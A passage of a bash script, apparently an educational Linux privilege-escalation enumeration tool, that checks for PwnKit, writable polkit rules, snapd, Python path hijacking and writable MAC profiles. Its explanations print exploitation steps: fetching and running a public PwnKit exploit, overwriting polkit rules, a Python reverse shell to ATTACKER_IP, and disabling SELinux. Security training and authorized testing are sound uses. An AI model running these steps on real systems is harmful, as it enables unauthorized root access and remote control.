    local pkexec_path=$(which pkexec)
    local has_vulnerability=0
    local has_writable_rules=0
    
    info "pkexec found: $pkexec_path"
    
    # Check version for PwnKit
    local version=$(pkexec --version 2>/dev/null | grep -oE '[0-9]+\.[0-9]+' | head -1)
    if [ -n "$version" ]; then
        info "pkexec version: $version"
        
        # Simple version comparison for 0.120
        local major=$(echo "$version" | cut -d. -f1)
        local minor=$(echo "$version" | cut -d. -f2)
        
        if [ "$major" -eq 0 ] && [ "$minor" -lt 120 ]; then
            has_vulnerability=1
            critical "pkexec vulnerable to PwnKit (CVE-2021-4034) - Instant root"
            vuln "pkexec version $version is vulnerable to CVE-2021-4034!"
            log ""
            teach "╔════════════════════════════════════════════════════════════╗"
            teach "║  CVE-2021-4034 - PwnKit (Memory Corruption)"
            teach "╚════════════════════════════════════════════════════════════╝"
            teach ""
            teach "WHAT IT IS:"
            teach "  A memory corruption vulnerability in pkexec that allows ANY"
            teach "  user to get root WITHOUT needing a password or any special"
            teach "  permissions. One of the most critical vulnerabilities of 2022."
            teach ""
            teach "BACKGROUND - What is pkexec:"
            teach "  pkexec is like sudo but uses polkit for authorization."
            teach "  Example: pkexec /bin/bash (asks for password, gives root shell)"
            teach "  It's SUID root, meaning it runs with root privileges."
            teach ""
            teach "WHY IT EXISTS - The Technical Flaw:"
            teach "  When you run a program in Linux, it receives arguments in an array."
            teach "  Example: ./program arg1 arg2 arg3"
            teach "  The array looks like: ['program', 'arg1', 'arg2', 'arg3', NULL]"
            teach ""
            teach "  pkexec makes a critical mistake when handling this array:"
            teach "  1. It counts the number of arguments"
            teach "  2. It removes the first argument (the program name)"
            teach "  3. It shifts everything down"
            teach ""
            teach "  THE BUG:"
            teach "  If you call pkexec with ZERO arguments (no command to execute),"
            teach "  pkexec tries to remove argument[0] but there's nothing there!"
            teach ""
            teach "  What happens:"
            teach "  1. pkexec receives: argv[0] = NULL (empty)"
            teach "  2. Tries to remove argv[0]"
            teach "  3. Shifts down, but shifts ENVIRONMENT variables instead"
            teach "  4. Now environment variables are in the argument array"
            teach "  5. pkexec processes them as if they were arguments"
            teach "  6. Attacker can inject malicious environment variables"
            teach "  7. These get executed with root privileges"
            teach ""
            teach "SIMPLIFIED ANALOGY:"
            teach "  Imagine a security guard checking a list of people:"
            teach "  1. Guard expects: [Name, ID, Purpose]"
            teach "  2. You give empty list: []"
            teach "  3. Guard removes first item (nothing there)"
            teach "  4. Guard accidentally reads from the NEXT paper (environment vars)"
            teach "  5. Treats that paper as if it was the approved list"
            teach "  6. You've tricked the guard into reading your fake approval"
            teach ""
            teach "WHY IT EXISTED FOR 12+ YEARS:"
            teach "  The vulnerability was introduced in pkexec's first version (2009)."
            teach "  It's a subtle bug - only triggers when argc = 0, which normally"
            teach "  never happens (programs always have at least one argument)."
            teach "  Took until 2021 for someone to think: 'What if argc = 0?'"
            teach ""
            teach "HOW TO EXPLOIT:"
            teach ""
            teach "  Method 1 - Use public exploit:"
            teach "  1. Download PwnKit exploit:"
            teach "     wget https://github.com/ly4k/PwnKit/raw/main/PwnKit"
            teach "  2. Make it executable:"
            teach "     chmod +x PwnKit"
            teach "  3. Run it:"
            teach "     ./PwnKit"
            teach "  4. Get root shell immediately"
            teach ""
            teach "  Method 2 - Compile from source:"
            teach "  1. Download C exploit code:"
            teach "     wget https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.c"
            teach "  2. Compile:"
            teach "     gcc cve-2021-4034.c -o exploit"
            teach "  3. Run:"
            teach "     ./exploit"
            teach ""
            teach "  The exploit works by:"
            teach "  1. Calling pkexec with argc = 0 (no arguments)"
            teach "  2. Setting malicious environment variable (GCONV_PATH)"
            teach "  3. GCONV_PATH points to attacker's shared library"
            teach "  4. pkexec loads the malicious library as root"
            teach "  5. Library executes attacker's code = root shell"
            teach ""
            teach "IMPACT:"
            teach "  • Works on almost ALL Linux distributions"
            teach "  • No password or special permissions needed"
            teach "  • ANY user (including restricted users) → Root"
            teach "  • Existed since 2009, affected billions of systems"
            teach "  • One of the most widespread Linux vulnerabilities ever"
            log ""
        else
            ok "pkexec version appears patched for PwnKit"
        fi
    fi
    
    # Check polkit rules for misconfigurations
    if [ -d /etc/polkit-1/rules.d ]; then
        find /etc/polkit-1/rules.d -name "*.rules" -type f 2>/dev/null | while read rule; do
            if [ -w "$rule" ]; then
                has_writable_rules=1
                critical "Writable polkit rule: $rule"
                vuln "Writable polkit rule: $rule"
                log ""
                teach "╔════════════════════════════════════════════════════════════╗"
                teach "║  Writable Polkit Rules - Policy Manipulation"
                teach "╚════════════════════════════════════════════════════════════╝"
                teach ""
                teach "WHAT THIS MEANS:"
                teach "  Polkit rules control who can do what privileged actions."
                teach "  If you can write to rule files, you can grant yourself access."
                teach ""
                teach "HOW POLKIT RULES WORK:"
                teach "  Rules are JavaScript files that define policies."
                teach "  Example rule:"
                teach "  polkit.addRule(function(action, subject) {"
                teach "    if (subject.user == \"bob\") {"
                teach "      return polkit.Result.YES;  // Bob can do anything"
                teach "    }"
                teach "  });"
                teach ""
                teach "EXPLOITATION:"
                teach "  1. Create a permissive rule:"
                teach "     echo 'polkit.addRule(function(action, subject) {' > $rule"
                teach "     echo '  if (subject.user == \"$(whoami)\") {' >> $rule"
                teach "     echo '    return polkit.Result.YES;' >> $rule"
                teach "     echo '  }' >> $rule"
                teach "     echo '});' >> $rule"
                teach ""
                teach "  2. Now you can run any pkexec command:"
                teach "     pkexec /bin/bash"
                log ""
            fi
        done
    fi
    
    # Only show additional educational content if something was found
    if [ $has_vulnerability -eq 1 ] || [ $has_writable_rules -eq 1 ]; then
        log ""
        teach "═══════════════════════════════════════════════════════════════"
        teach "POLKIT - UNDERSTANDING THE SYSTEM"
        teach "═══════════════════════════════════════════════════════════════"
        teach ""
        teach "POLKIT vs SUDO:"
        teach "  SUDO: Simple file (/etc/sudoers), binary decision, CLI-focused"
        teach "  POLKIT: Policy framework, complex rules, GUI-focused"
        teach ""
        teach "WHY POLKIT EXISTS:"
        teach "  Desktop GUIs need smooth privilege delegation without sudo prompts."
        teach "  Examples: Software updates, USB mounting, network configuration"
        teach ""
        teach "COMPONENTS:"
        teach "  • pkexec: Command-line tool (SUID root)"
        teach "  • polkitd: Background daemon making decisions"
        teach "  • Policies: XML in /usr/share/polkit-1/actions/"
        teach "  • Rules: JavaScript in /etc/polkit-1/rules.d/"
        teach ""
        teach "SECURITY IMPLICATIONS:"
        teach "  • pkexec is SUID root → bugs = privilege escalation"
        teach "  • Writable rules = unauthorized access"
        teach "  • Race conditions in polkitd = bypass authorization"
        log ""
    fi
}
# === SNAP PACKAGES ===
enum_snap() {
    section "SNAP PACKAGE ANALYSIS"
    
    explain_concept "Snap Packages & Confinement" \
        "Snap packages can run in different confinement modes. 'devmode' disables security, 'classic' has no isolation. These can be exploited." \
        "Snaps in devmode or classic confinement have full system access. If you can modify snap applications or their data, you might execute code with fewer restrictions. Dirty_sock exploited snapd socket permissions." \
        "Check:\n  â€¢ Snaps in devmode (snap list)\n  â€¢ Writable snap directories\n  â€¢ snapd socket permissions\n  â€¢ Dirty_sock vulnerability (CVE-2019-7304)"
    
    if command -v snap >/dev/null 2>&1; then
        info "Snap is installed"
        
        # Check for devmode/classic snaps
        snap list 2>/dev/null | grep -E "devmode|classic" | while read line; do
            warn "Snap with relaxed confinement: $line"
        done
        
        # Check snapd socket
        if [ -S /run/snapd.socket ]; then
            info "snapd socket exists: /run/snapd.socket"
            
            if [ -w /run/snapd.socket ]; then
                critical "snapd socket is WRITABLE - Potential Dirty_sock exploit"
                vuln "snapd socket is writable!"
                teach "Check for Dirty_sock vulnerability (CVE-2019-7304)"
                teach "  snapd versions < 2.37 vulnerable"
            fi
        fi
        
        # Check for writable snap directories
        find /snap -maxdepth 2 -type d -writable 2>/dev/null | head -5 | while read dir; do
            warn "Writable snap directory: $dir"
        done
    else
        ok "Snap not installed"
    fi
}

# === PYTHON LIBRARY PATH HIJACKING ===
enum_python_paths() {
    section "PYTHON LIBRARY PATH HIJACKING"
    
    explain_concept "Python Library Hijacking" \
        "Python searches for modules in specific directories. If you can write to these paths, you can inject malicious modules that get imported by privileged scripts." \
        "When Python imports a module, it searches sys.path in order. If an early directory is writable, you can place a malicious module there. If a root script imports it, your code runs as root." \
        "Exploitation:\n  1. Find writable path: python3 -c 'import sys; print(sys.path)'\n  2. Identify module used by root script\n  3. Create malicious module in writable path\n  4. Wait for script execution"
    
    if command -v python3 >/dev/null 2>&1 || command -v python >/dev/null 2>&1; then
        local python_cmd=$(command -v python3 2>/dev/null || command -v python 2>/dev/null)
        
        info "Python executable: $python_cmd"
        
        # Get Python paths
        local python_paths=$($python_cmd -c "import sys; print('\n'.join(sys.path))" 2>/dev/null)
        
        info "Python module search paths:"
        echo "$python_paths" | while read path; do
            [ -z "$path" ] && continue
            
            if [ -d "$path" ]; then
                if [ -w "$path" ]; then
                    critical "WRITABLE Python path: $path - Hijack imports for privilege escalation"
                    vuln "Writable Python library path: $path"
                    teach "Create malicious module here that matches imports in root scripts"
                    teach "Example malicious module (os.py):"
                    teach "  import socket,subprocess,os"
                    teach "  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)"
                    teach "  s.connect(('ATTACKER_IP',4444))"
                    teach "  os.dup2(s.fileno(),0)"
                    teach "  os.dup2(s.fileno(),1)"
                    teach "  os.dup2(s.fileno(),2)"
                    teach "  subprocess.call(['/bin/sh','-i'])"
                else
                    log "  $path (not writable)"
                fi
            fi
        done
        
        # Check PYTHONPATH
        if [ -n "$PYTHONPATH" ]; then
            info "PYTHONPATH is set: $PYTHONPATH"
            echo "$PYTHONPATH" | tr ':' '\n' | while read path; do
                if [ -w "$path" ]; then
                    vuln "PYTHONPATH contains writable directory: $path"
                fi
            done
        fi
        
        # Check for Python scripts run by root (in cron, etc.)
        if [ -r /etc/crontab ]; then
            if grep -E "\.py|python" /etc/crontab 2>/dev/null | grep -v "^#" | grep -q "."; then
                warn "Python scripts in crontab - check their import statements"
                grep -E "\.py|python" /etc/crontab 2>/dev/null | grep -v "^#" | while read line; do
                    log "  $line"
                done
            fi
        fi
    fi
}

# === APPARMOR/SELINUX WRITABLE PROFILES ===
enum_mac_writable() {
    section "MAC PROFILE WRITABILITY"
    
    explain_concept "Writable MAC Profiles" \
        "If AppArmor or SELinux profiles are writable, you can weaken security policies to allow previously blocked actions." \
        "MAC policies restrict what programs can do. If you can modify these policies, you can remove restrictions on exploitable binaries or grant yourself new capabilities." \
        "Exploitation:\n  AppArmor: Modify profile to complain mode or allow all\n  SELinux: Change file contexts or create permissive domains"
    
    # AppArmor profiles
    if [ -d /etc/apparmor.d ]; then
        find /etc/apparmor.d -name "*" -type f -writable 2>/dev/null | while read profile; do
            critical "Writable AppArmor profile: $profile"
            vuln "Writable AppArmor profile: $profile"
            teach "Modify profile to complain mode or remove restrictions"
            teach "  After modifying: apparmor_parser -r $profile"
        done
    fi
    
    # SELinux policies
    if command -v semanage >/dev/null 2>&1; then
        if [ -w /etc/selinux/config ]; then
            critical "SELinux config WRITABLE: /etc/selinux/config"
            vuln "/etc/selinux/config is writable!"
            teach "Set SELINUX=permissive or SELINUX=disabled"
            teach "  Requires reboot or: setenforce 0"
        fi
    fi
}
# === MAIN EXECUTION ===
main() {
    cat << "EOF"

    ════════════════════════════════════════════════════════════════
EOF
    echo -e ""
    echo -e "\033[31mM\"\"\033[33mMMMMMMMM\033[0m                                     \033[34mMM\"\"\"\"\"\"\"'YM\033[0m                            "
    echo -e "\033[31mM  \033[33mMMMMMMMM\033[0m                                     \033[34mMM  mmmmm  M\033[0m                            "
    echo -e "\033[31mM  \033[33mMMMMMMMM\033[0m .d8888b. .d8888b. 88d888b. 88d888b. \033[34mM'        .M\033[0m .d8888b. .d8888b. .d8888b. "
    echo -e "\033[31mM  \033[33mMMMMMMMM\033[0m 88ooood8 88'  '88 88'  '88 88'  '88 \033[34mMM  MMMMMMMM\033[0m 88ooood8 88'  '88 Y8ooooo. "
    echo -e "\033[31mM  \033[33mMMMMMMMM\033[0m 88.  ... 88.  .88 88       88    88 \033[34mMM  MMMMMMMM\033[0m 88.  ... 88.  .88       88 "
    echo -e "\033[31mM  \033[32m       M\033[0m '88888P' '88888P8 dP       dP    dP \033[34mMM  MMMMMMMM\033[0m '88888P' '88888P8 '88888P' "
    echo -e "\033[32mMMMMMMMMMMMM\033[0m                                     \033[34mMMMMMMMMMMMM\033[0m                            "
    cat << "EOF"
    
              Educational Privilege Escalation Tool - Version 1.7.0
                              Made by Wiz-Works
    ════════════════════════════════════════════════════════════════

EOF
    
    log ""
    log "${R}════════════════════════════════════════════════════════════════${RST}"
    log "${R}                      LEGAL DISCLAIMER                          ${RST}"
    log "${R}════════════════════════════════════════════════════════════════${RST}"
    log "${Y}This tool is for AUTHORIZED TESTING ONLY.${RST}"
    log "${Y}Intended use: CTF competitions, authorized pentesting, education${RST}"
    log "${R}Unauthorized access to computer systems is ILLEGAL.${RST}"
    log "${R}You are responsible for ensuring you have permission to test.${RST}"
    log "${R}════════════════════════════════════════════════════════════════${RST}"
    log ""
    log "${G}════════════════════════════════════════════════════════════════${RST}"
    log "${Y}[*] Purpose: Educational enumeration with detailed explanations${RST}"
    log "${Y}[*] Every vulnerability includes WHAT, WHY, and HOW to exploit${RST}"
    log "${C}[*] Not affiliated with PEASS-ng/LinPEAS project${RST}"
    log "${G}════════════════════════════════════════════════════════════════${RST}"
    log ""
    log "${C}[+] Log file: $LOG_FILE${RST}"
    log "${C}[+] Started: $(date)${RST}"
    log "${P}[+] Extended mode: ENABLED${RST}"
    log "${W}[+] Development status: Beta ${RST}"
    log ""
    # Core enumeration
    enum_system
    enum_network
    enum_users
    enum_processes
    enum_mail_logs
    
    # Permission-based vectors
    enum_sudo
    enum_sudo2
    enum_sudo_version
    enum_sudo_tokens
    enum_suid
    enum_sgid
    enum_writable_files
    enum_capabilities
    enum_ld_preload
    
    # Group-based vectors
    enum_groups
    
    # Service-based vectors
    enum_boot_scripts
    enum_cron
    enum_systemd
    
    # Kernel & container
    enum_kernel
    enum_kernel_modules
    enum_polkit
    enum_snap
    enum_container
    enum_mac
    enum_mac_writable
    
    # Path & environment
    enum_path
    enum_python_paths
    enum_env
    
    # File system
    enum_nfs
    enum_wildcards
    enum_backups
    enum_mounts
    enum_world_writable
    
    # Credential hunting
    enum_passwords
    enum_core_dumps
    enum_software_versions
    enum_interesting_files
    enum_hidden_files
    
    #  HTB-specific enumeration
    enum_smb
    enum_git_exposure
    enum_tomcat
    enum_spring_actuator
    enum_wordpress_extended
    
    # Tools
    enum_tools
    enum_scheduled
    enum_process_monitor
    enum_clipboard
    
    # Extended modules (optional)
    if [ $EXTENDED -eq 1 ]; then
        log ""
        log "${P}═══════════════════════════════════════${RST}"
        log "${P}    EXTENDED ENUMERATION MODULES${RST}"
        log "${P}═══════════════════════════════════════${RST}"
        
        # Phase 1: High-value additions
        enum_cloud_metadata
        enum_language_creds
        enum_api_keys
        enum_databases_extended
        enum_cicd
        
        # Original extended modules
        enum_databases
        enum_web
        enum_post_exploit
        enum_ctf_flags
        enum_pivoting
    fi
    
    # Critical findings summary
    if grep -q "CRITICAL" "$LOG_FILE"; then
        section "⚠️  CRITICAL FINDINGS SUMMARY"
        log "${CRIT}Found instant privilege escalation opportunities:${RST}"
        log ""
        grep "CRITICAL" "$LOG_FILE" | while read line; do
            log "$line"
        done
        log ""
    fi
    
    # CTF flags summary
    if grep -q "CTF FLAG" "$LOG_FILE"; then
        section "🚩 CTF FLAGS DISCOVERED"
        log "${FLAG}Flag locations found:${RST}"
        log ""
        grep "\[🚩 CTF FLAG 🚩\]" "$LOG_FILE" | while read line; do
           log "$line"
        done
        log ""
        if [ $SHOW_FLAGS -eq 0 ]; then
            info "Rerun with --flags to reveal flag contents"
       fi
    fi
    
    section "ENUMERATION COMPLETE"
    log "${Y}═══════════════════════════════════════${RST}"
    log "${Y}NEXT STEPS:${RST}"
    log "1. Review all ${CRIT}CRITICAL${RST} findings above for instant wins"
    log "2. Review all VULNERABLE findings"
    log "3. Read the LEARN sections to understand each vulnerability"
    log "4. Test exploits manually (don't just run automated tools)"
    log "5. Document what you learn for future reference"
    log ""
    log "${Y}EDUCATIONAL GOALS:${RST}"
    log "• Recognize these patterns on other systems"
    log "• Understand Linux security model deeply"
    log "• Know what to look for during initial access"
    log "• Build mental models, not just command lists"
    log ""
    log "${G}Full enumeration log: $LOG_FILE${RST}"
    log "Run completed: $(date)"
}

# Parse arguments
while [ $# -gt 0 ]; do
    case "$1" in
        -q|--quick)
            QUICK_MODE=1
            shift
            ;;
        -e|--extended)
            EXTENDED=1
            shift
            ;;
        -v|--verbose)
            VERBOSE=1
            shift
            ;;
        --no-explain)
            EXPLAIN=0
            shift
            ;;
            -f|--flags) 
            SHOW_FLAGS=1
            shift
            ;;
        -h|--help)
            echo "TeachPEAS - Educational Privilege Escalation Enumeration"
            echo ""
            echo "Usage: $0 [OPTIONS]"
            echo ""
            echo "Options:"
            echo "  -q, --quick      Quick scan (skip some slow checks)"
            echo "  -e, --extended   Enable extended modules (databases, web, post-exploit, CTF flags)"
            echo "  -v, --verbose    Verbose output"
            echo "  --no-explain     Skip educational explanations"
            echo "  -h, --help       Show this help"
            echo ""
            echo "Extended modules include:"
            echo "  • Cloud metadata enumeration (AWS/Azure/GCP)"
            echo "  • Language-specific credential discovery (.env, package.json, etc.)"
            echo "  • Database enumeration (MySQL, PostgreSQL, Redis, MongoDB)"
            echo "  • Web application analysis (config files, writable web roots)"
            echo "  • CI/CD secret exposure (Git, Jenkins, GitLab)"
            echo "  • Post-exploitation techniques (persistence, lateral movement)"
            echo "  • CTF flag hunting (common patterns and locations)"
            echo "  • Network pivoting setup (SSH tunneling, internal networks)"
            echo ""
            exit 0
            ;;
        *)
            echo "Unknown option: $1"
            echo "Use --help for usage information"
            exit 1
            ;;
    esac
done

main
